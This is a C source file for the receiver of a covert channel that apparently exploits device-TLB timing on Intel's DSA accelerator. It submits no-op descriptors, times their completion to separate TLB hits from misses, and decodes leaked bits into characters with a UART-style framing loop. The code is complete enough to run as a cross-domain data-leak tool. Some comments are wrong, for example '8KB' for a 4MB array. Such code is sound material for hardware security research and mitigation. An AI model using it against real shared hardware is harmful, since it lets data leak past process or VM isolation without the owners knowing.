#include "dsa.h"

#define BLEN (4096 << 0)  // 4KB
#define COMP_ARRAY_SIZE (4096 << 10)  // 8KB
#define CALIBRATION_RUNS 10000
#define BIT_INTERVAL_US 100000
#define DIFF_THRESHOLD 300
#define CALIBRATION_RETRIES 5
#define DATA_BITS 8
#define UART_START_BITS 2  // Two consecutive 1s for start

// Modified UART frame states
#define UART_STATE_IDLE 0
#define UART_STATE_START_BIT1 1
#define UART_STATE_START_BIT2 2
#define UART_STATE_DATA_BITS 3
#define UART_STATE_STOP_BIT 4

#define UPDATE_THRESHOLD(hit, miss) ((hit * 2 + miss) / 3)

struct wq_info wq_info;
struct dsa_hw_desc desc = {};

uint64_t probe(void* addr) {
    uint64_t start, end, retry = 0;
    struct dsa_completion_record* comp_record = (struct dsa_completion_record*)addr;
    memset(comp_record, 0, sizeof(struct dsa_completion_record));
    
    desc.completion_addr = (uintptr_t)comp_record;
    
    if (wq_info.wq_mapped) {
        start = rdtsc();
        submit_desc(wq_info.wq_portal, &desc);
    } else {
        int rc = write(wq_info.wq_fd, &desc, sizeof(desc));
        if (rc != sizeof(desc)) {
            fprintf(stderr, "[cc_receiver] Failed to submit descriptor\n");
            return 0;
        }
        start = rdtsc();
    }
    
    while (comp_record->status == 0 && retry++ < MAX_COMP_RETRY) {
        umonitor(comp_record);
        if (comp_record->status == 0) {
            uint64_t delay = rdtsc() + UMWAIT_DELAY;
            umwait(UMWAIT_STATE_C0_1, delay);
        }
    }
    end = rdtsc();
    
    return end - start;
}

int main(int argc, char *argv[]) {
    printf("[cc_receiver] Starting modified UART-style covert channel receiver...\n");
    
    struct dsa_completion_record* comp_array = 
        (struct dsa_completion_record*)aligned_alloc(32, COMP_ARRAY_SIZE);
    if (!comp_array) {
        fprintf(stderr, "[cc_receiver] Failed to allocate memory\n");
        return EXIT_FAILURE;
    }
    memset(comp_array, 0, COMP_ARRAY_SIZE);
    
    int rc = map_wq(&wq_info);
    if (rc) {
        fprintf(stderr, "[cc_receiver] Failed to map work queue: %d\n", rc);
        return EXIT_FAILURE;
    }

    desc.opcode = DSA_OPCODE_NOOP;
    desc.flags = IDXD_OP_FLAG_CRAV | IDXD_OP_FLAG_RCR;
    
    int calib_retry = 0;
calib:
    printf("[cc_receiver] Calibrating device-TLB hit and miss latencies...\n");
    if (calib_retry++ > CALIBRATION_RETRIES) {
        printf("[cc_receiver] Calibration failed after %d retries\n", CALIBRATION_RETRIES);
        return EXIT_FAILURE;
    }
    
    uint64_t miss_total = 0, hit_total = 0;
    probe(comp_array);
    
    for (int i = 0; i < CALIBRATION_RUNS; i++) {
        probe(&comp_array[4096 << 1]);
        probe(&comp_array[4096 << 2]);
        probe(&comp_array[(4096 << 2) + 4096]);
        miss_total += probe(&comp_array[0]);
        hit_total += probe(&comp_array[0]); // Now in TLB
    }
    uint64_t avg_miss = miss_total / CALIBRATION_RUNS;
    uint64_t avg_hit = hit_total / CALIBRATION_RUNS;

    if (avg_miss <= avg_hit || avg_miss - avg_hit < DIFF_THRESHOLD) {
        printf("[cc_receiver] Miss: %lu, Hit: %lu, Diff: %lu\n", 
               avg_miss, avg_hit, avg_miss - avg_hit);
        goto calib;
    }
    uint64_t detection_threshold = UPDATE_THRESHOLD(avg_hit, avg_miss);
    
    printf("[cc_receiver] Calibration results:\n");
    printf("\tTLB miss latency: %lu cycles\n", avg_miss);
    printf("\tTLB hit latency:  %lu cycles\n", avg_hit);
    printf("\tDetection threshold: %lu cycles\n", detection_threshold);
    
    // Main reception loop
    printf("[cc_receiver] Starting reception (press Ctrl+C to stop)...\n");
    
    unsigned char received_char = 0;
    int bit_position = 0;
    int uart_state = UART_STATE_IDLE;
    int consecutive_ones = 0;
    
    while (1) {
        probe(comp_array);
        usleep(BIT_INTERVAL_US);
        uint64_t latency = probe(comp_array);
        
        bool bit_value = (latency > detection_threshold);
        
        switch (uart_state) {
            case UART_STATE_IDLE:
                if (bit_value) {
                    // First 1 bit of start sequence detected
                    uart_state = UART_STATE_START_BIT2;
                }
                break;
                
            case UART_STATE_START_BIT2:
                if (bit_value) {
                    // Second 1 bit of start sequence detected
                    uart_state = UART_STATE_DATA_BITS;
                    bit_position = 0;
                    received_char = 0;
                } else {
                    uart_state = UART_STATE_IDLE;
                }
                break;
                
            case UART_STATE_DATA_BITS:
                printf("[cc_receiver] Received bit: %d (latency = %lu, state = %d)\n", 
                       bit_value, latency, uart_state);

                if (bit_value) {
                    received_char |= (1 << bit_position);
                }
                bit_position++;
                
                // When we've received all data bits
                if (bit_position >= DATA_BITS) {
                    uart_state = UART_STATE_STOP_BIT;
                    printf("[cc_receiver] All data bits received, expecting stop bit\n");
                }
                break;
                
            case UART_STATE_STOP_BIT:
                // Check if stop bit is correct (1)
                if (bit_value) {
                    // Valid stop bit
                    printf("[cc_receiver] Valid stop bit received\n");
                    printf("[cc_receiver] Received character: '%c' (ASCII: %d)\n", 
                           received_char, received_char);
                } else {
                    // Invalid stop bit
                    printf("[cc_receiver] ERROR: Invalid stop bit (0 instead of 1)\n");
                }
                
                // Reset for next character
                uart_state = UART_STATE_IDLE;
                break;
        }
        
        // Adaptively update detection threshold
        if (latency < detection_threshold) {
            avg_hit = (avg_hit * 99 + latency) / 100; // Moving average
        } else {
            avg_miss = (avg_miss * 99 + latency) / 100; // Moving average
        }
        detection_threshold = UPDATE_THRESHOLD(avg_hit, avg_miss);
    }
    
    // Cleanup
    if (wq_info.wq_mapped && wq_info.wq_portal != MAP_FAILED) {
        munmap(wq_info.wq_portal, 0x1000);
    }
    if (wq_info.wq_fd >= 0) {
        close(wq_info.wq_fd);
    }
    free(comp_array);
    
    return EXIT_SUCCESS;
} 